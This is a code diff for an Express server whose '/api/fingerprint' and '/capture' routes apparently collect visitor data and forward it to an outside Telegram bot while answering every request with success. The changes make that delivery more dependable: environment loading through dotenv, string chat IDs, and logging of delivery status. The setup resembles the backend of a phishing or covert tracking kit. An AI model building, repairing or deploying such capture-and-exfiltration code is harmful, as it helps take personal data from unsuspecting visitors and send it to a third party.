@@ -3,6 +3,9 @@ import cors from 'cors';
 import fetch from 'node-fetch';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import dotenv from 'dotenv';
+
+dotenv.config();
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -11,8 +14,19 @@ const app = express();
 const PORT = Number(process.env.PORT) || 8080;
 const distPath = path.join(__dirname, 'dist');
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID;
+const getEnvValue = (...keys) => {
+  for (const key of keys) {
+    const value = process.env[key];
+    if (typeof value === 'string' && value.trim()) {
+      return value.trim();
+    }
+  }
+  return '';
+};
+
+const TELEGRAM_BOT_TOKEN = getEnvValue('TELEGRAM_BOT_TOKEN', 'TELEGRAM_TOKEN');
+const TELEGRAM_CHAT_ID = getEnvValue('TELEGRAM_CHAT_ID', 'CHAT_ID');
+const hasTelegramConfig = Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
 
 app.disable('x-powered-by');
 app.use(cors());
@@ -45,21 +59,26 @@ app.post('/api/fingerprint', async (req, res) => {
     `🕒 Timestamp: ${new Date().toISOString()}`,
   ];
 
-  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+  if (hasTelegramConfig) {
     try {
       const telegramMessage = lines.join('\n');
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: Number(TELEGRAM_CHAT_ID),
+          chat_id: String(TELEGRAM_CHAT_ID),
           text: telegramMessage,
           parse_mode: 'HTML',
         }),
       });
+
+      const responseText = await telegramResponse.text();
+      console.log('Telegram fingerprint delivery status:', telegramResponse.status, responseText);
     } catch (err) {
       console.error('Telegram fingerprint delivery failed:', err.message || err);
     }
+  } else {
+    console.warn('Telegram config missing for fingerprint route.');
   }
 
   return res.json({ success: true });
@@ -85,11 +104,11 @@ app.post('/capture', async (req, res) => {
 ⏰ <b>Time:</b> ${new Date(time || Date.now()).toLocaleString()}
   `.trim();
 
-  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+  if (hasTelegramConfig) {
     try {
       const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const payload = {
-        chat_id: Number(TELEGRAM_CHAT_ID),
+        chat_id: String(TELEGRAM_CHAT_ID),
         text: message,
         parse_mode: 'HTML',
       };
@@ -107,7 +126,7 @@ app.post('/capture', async (req, res) => {
       console.error('❌ Telegram failed:', err.message);
     }
   } else {
-    console.warn('⚠️ Telegram credentials are missing or invalid.');
+    console.warn('⚠️ Telegram credentials are missing or invalid. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in a .env file or shell environment.');
   }
 
   res.json({ success: true });
@@ -119,4 +138,9 @@ app.get('*', (req, res) => {
 
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
+  if (hasTelegramConfig) {
+    console.log('✅ Telegram delivery enabled.');
+  } else {
+    console.warn('⚠️ Telegram delivery disabled: missing TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.');
+  }
 });
